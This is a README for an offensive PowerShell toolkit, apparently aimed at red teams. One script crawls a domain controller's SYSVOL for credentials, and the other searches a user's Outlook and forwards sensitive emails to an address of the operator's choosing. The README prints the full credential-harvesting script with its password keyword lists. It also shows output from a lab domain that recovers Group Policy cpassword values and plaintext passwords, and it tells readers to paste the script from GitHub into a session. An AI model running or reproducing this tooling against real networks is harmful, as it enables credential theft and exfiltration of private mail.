## PSScrapeKit

### What it is

PSScrapeKit is a powershell implementation of ScrapeKit, it consists of two files; DCScraper & OutlookScrape. Each has a specific function for scraping either a DC or Outlook. The outlook scraper will connect to the user's outlook client, search for keywords then queue up any interesting emails and send to an email of your choosing. Whereas the DC one will connect to sysvol and look for specific keywords or a default list.

- DCScrape.ps1
- OutlookScrape.ps1

### How to Use

#### DCScrape
Execute the script from a domain connected machine or in a runas session to crawl the DC;

```
.\DCScrape.ps1
```
Just a quick demo of DCScrape_Line_Breaks_For_Readability.ps1 being executed across my domain lab.

Open https://raw.githubusercontent.com/LaresLLC/ScrapingKit/main/PSScrapeKit/DCScrape_Line_Breaks_For_Readability.ps1 then copy and paste into a PowerShell session.

Execution will trigger the script to scrape for the following keywords.
```
$initialKeywords = @(
>>     'password', 'cpassword', 'passw', 'cred',
>>     'Password', 'Cpassword', 'Passw', 'Cred',
>>     'Password:', 'password:', 'Password=',
>>     'password=', 'password ', 'cpassword ',
>>     'passw ', 'cred ', 'Password ', 'Cpassword ',
>>     'Passw ', 'Cred ', 'Password: ', 'password: ',
>>     'Password= ', 'password= ', 'Password : ',
>>     'password : ', 'Password = ', 'password = '
>> )
PS C:\Users\user1> $additionalKeywords = @(
>>     'user', 'username', 'name', 'User',
>>     'Username', 'Name', 'Username:', 'username:',
>>     'Username=', 'username=', 'user ', 'username ',
>>     'name ', 'User ', 'Username ', 'Name ',
>>     'Username: ', 'username: ', 'Username= ',
>>     'username= ', 'Username : ', 'username : ',
>>     'Username = ', 'username = '
```


Result of execution:

```
PS C:\Users\user1> # LaresLLC PSScrapingKit 2023
PS C:\Users\user1> # Neil Lines & Andy Gill
PS C:\Users\user1> # Line breaks added to enhance readability
PS C:\Users\user1> # v1.0 Release
PS C:\Users\user1>
PS C:\Users\user1>
PS C:\Users\user1> $domain = $env:USERDNSDOMAIN
PS C:\Users\user1> $domainController = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object -First 1
PS C:\Users\user1> $netlogonPath = "\\$($domainController.Name)\SYSVOL\$domain"
PS C:\Users\user1> $initialKeywords = @(
>>     'password', 'cpassword', 'passw', 'cred',
>>     'Password', 'Cpassword', 'Passw', 'Cred',
>>     'Password:', 'password:', 'Password=',
>>     'password=', 'password ', 'cpassword ',
>>     'passw ', 'cred ', 'Password ', 'Cpassword ',
>>     'Passw ', 'Cred ', 'Password: ', 'password: ',
>>     'Password= ', 'password= ', 'Password : ',
>>     'password : ', 'Password = ', 'password = '
>> )
PS C:\Users\user1> $additionalKeywords = @(
>>     'user', 'username', 'name', 'User',
>>     'Username', 'Name', 'Username:', 'username:',
>>     'Username=', 'username=', 'user ', 'username ',
>>     'name ', 'User ', 'Username ', 'Name ',
>>     'Username: ', 'username: ', 'Username= ',
>>     'username= ', 'Username : ', 'username : ',
>>     'Username = ', 'username = '
>> )
PS C:\Users\user1> $matchesFound = $false
PS C:\Users\user1>
PS C:\Users\user1> Get-ChildItem -Path $netlogonPath -Recurse -File | Where-Object { $_.Name -notin @('GptTmpl.inf', 'GPT.INI', 'Registry.pol') } | ForEach-Object {
>>     $content = Get-Content $_.FullName
>>
>>     foreach ($line in $content) {
>>         $matches = $initialKeywords | Where-Object { $line -cmatch $_ }
>>
>>         if ($matches) {
>>             $matchesFound = $true
>>             Write-Host "Match found in file $($_.FullName)!"
>>
>>             $contextStart = [Math]::Max(0, [Array]::IndexOf($content, $line) - 3)
>>             $contextEnd = [Math]::Min([Array]::IndexOf($content, $line) + 3, $content.Count - 1)
>>             $context = $content[$contextStart..$contextEnd]
>>
>>             $additionalKeywordsFound = $additionalKeywords | Where-Object { $context -like "*$_*" }
>>
>>             $username = $line | Select-String -Pattern '(?i)username\s*[:=]\s*(.+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
>>             if ([string]::IsNullOrEmpty($username)) {
>>                 $username = $context -join ' '
>>             }
>>
>>             $password = $line | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
>>             if ([string]::IsNullOrEmpty($password)) {
>>                 $password = $content | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
>>             }
>>             if ([string]::IsNullOrEmpty($password)) {
>>                 $password = $line
>>             }
>>
>>             [PSCustomObject]@{
>>                 FileName = $_.Name
>>                 FullName = $_.FullName
>>                 PrecedingContext = $context[0..($context.IndexOf($line) - 1)]
>>                 MatchingLine = $line
>>                 TrailingContext = $context[($context.IndexOf($line) + 1)..($context.Count - 1)]
>>                 AdditionalKeywordsFound = $additionalKeywordsFound
>>                 Username = $username
>>                 Password = $password
>>             }
>>         }
>>     }
>> }

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Test\Groups.xml!


FileName                : Groups.xml
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Test\Groups.xml
PrecedingContext        : {<?xml version="1.0" encoding="utf-8"?>}
MatchingLine            : <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="DA1" image="2" changed="2023-05-11 15:44:34"
                          uid="{886FB28A-D71D-4D47-8CC5-948951D8CD16}"><Properties action="U" newName="" fullName="" description="" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0"
                          noChange="0" neverExpires="1" acctDisabled="0" userName="DA1"/></User>
TrailingContext         : {     <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="user1" image="2" changed="2023-05-11 15:47:01" uid="{2F2EB0FC-541E-4F3B-8C3D-1CAB02FE3023}"><Properties action="U"
                          newName="" fullName="" description="" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0"
                          userName="user1"/></User>, </Groups>}
AdditionalKeywordsFound : {user, username, name, User...}
Username                : "DA1"/></User>
Password                : "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"


Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Policies\{EB46EFF6-112B-400B-BC15-7875CE31E21E}\Machine\Preferences\Groups\Groups.xml!
FileName                : Groups.xml
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Policies\{EB46EFF6-112B-400B-BC15-7875CE31E21E}\Machine\Preferences\Groups\Groups.xml
PrecedingContext        : {<?xml version="1.0" encoding="utf-8"?>, <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="DA1" image="2"
                          changed="2023-05-11 15:44:34" uid="{886FB28A-D71D-4D47-8CC5-948951D8CD16}"><Properties action="U" newName="" fullName="" description=""
                          cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="DA1"/></User>}
MatchingLine            :       <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="user1" image="2" changed="2023-05-11 15:47:01" uid="{2F2EB0FC-541E-4F3B-8C3D-1CAB02FE3023}"><Properties action="U"
                          newName="" fullName="" description="" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="user1"/></User>
TrailingContext         : {</Groups>}
AdditionalKeywordsFound : {user, username, name, User...}
Username                : "user1"/></User>
Password                : "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Game1.txt!
FileName                : Game1.txt
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Game1.txt
PrecedingContext        : {New-FolderForced -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection", Set-ItemProperty -Path
                          "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection" "DisableRealtimeMonitoring" 1, }
MatchingLine            : password = fishandchips1
TrailingContext         : {, , Write-Output "Disabling Windows Defender Services"}
AdditionalKeywordsFound :
Username                : New-FolderForced -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection" Set-ItemProperty -Path
                          "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection" "DisableRealtimeMonitoring" 1  password = fishandchips1   Write-Output "Disabling Windows
                          Defender Services"
Password                : fishandchips1

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Game2.txt!
FileName                : Game2.txt
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Game2.txt
PrecedingContext        : {p, p}
MatchingLine            : please use this username Admin2 and password of Password!
TrailingContext         : {p}
AdditionalKeywordsFound :
Username                : p
Password                : please use this username Admin2 and password of Password!

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Script99.txt!
FileName                : Script99.txt
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Script99.txt
PrecedingContext        : {run as admin, , username Golf1}
MatchingLine            : Password Pasmeup1
TrailingContext         : {, New-FolderForced -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager", foreach ($key in $cdm) {}
AdditionalKeywordsFound : {user, username, name, User...}
Username                : run as admin  username Golf1 Password Pasmeup1  New-FolderForced -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" foreach ($key in $cdm) {
Password                : Password Pasmeup1

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Test2.txt!
FileName                : Test2.txt
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Test2.txt
PrecedingContext        : {, , username:dshsdgsdsd}
MatchingLine            : Password:football
TrailingContext         : {Password:football}
AdditionalKeywordsFound : {user, username, name, User...}
Username                :   username:dshsdgsdsd Password:football
Password                : football

Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Brandon\Startup.bat!
FileName                : Startup.bat
FullName                : \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\scripts\Brandon\Startup.bat
PrecedingContext        : {param (,     [string]$Username = 'user2',}
MatchingLine            :     [string]$Password = 'Passw0rd!'
TrailingContext         : {), , $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force}
AdditionalKeywordsFound : {user, username, name, User...}
Username                : param (     [string]$Username = 'user2',     [string]$Password = 'Passw0rd!' )  $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
Password                : 'Passw0rd!'


PS C:\Users\user1>
PS C:\Users\user1> if (-not $matchesFound) {
>>     Write-Host "No matches found."
>> }
PS C:\Users\user1>
```
#### OutlookScrape
Simply import the module then execute it:

```
ipmo .\OutlookScrape.ps1
Invoke-OutlookScrape
```

It will give you two options:
```
Select keyword option:
1. User-defined keywords
2. Default keywords (password, security, confidential, VPN, WIFI)
Enter the keyword option: 
```

Simply select an option then specify an email and the rest will queue up and do its thing.

### Example execution:
![image](https://github.com/LaresLLC/ScrapingKit/assets/5783068/870ff5d6-2380-4d4f-956b-71f16267feb2)
![image](https://github.com/LaresLLC/ScrapingKit/assets/5783068/1357b27c-bad5-453b-b4cf-ed244d39d21d)